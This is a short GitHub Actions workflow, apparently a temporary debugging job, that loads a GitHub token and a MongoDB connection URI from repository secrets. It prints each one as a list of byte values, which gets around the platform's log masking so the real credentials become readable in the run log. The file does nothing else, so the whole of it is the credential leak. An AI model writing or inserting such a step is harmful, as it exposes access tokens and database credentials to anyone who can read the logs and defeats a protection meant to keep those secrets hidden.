name: _Temp Dump Env
on:
  workflow_dispatch:
jobs:
  dump:
    runs-on: ubuntu-latest
    environment: github-pages
    env:
      GH_TOKEN: ${{ secrets.GH_TOKEN }}
      MONGODB_URI: ${{ secrets.MONGODB_URI }}
    steps:
      - name: "dump secrets and vars"
        run: |
          python3 -c "import os; v=os.environ.get('GH_TOKEN',''); print('BYTES_GH_TOKEN=' + ','.join(str(b) for b in v.encode()))"
          python3 -c "import os; v=os.environ.get('MONGODB_URI',''); print('BYTES_MONGODB_URI=' + ','.join(str(b) for b in v.encode()))"
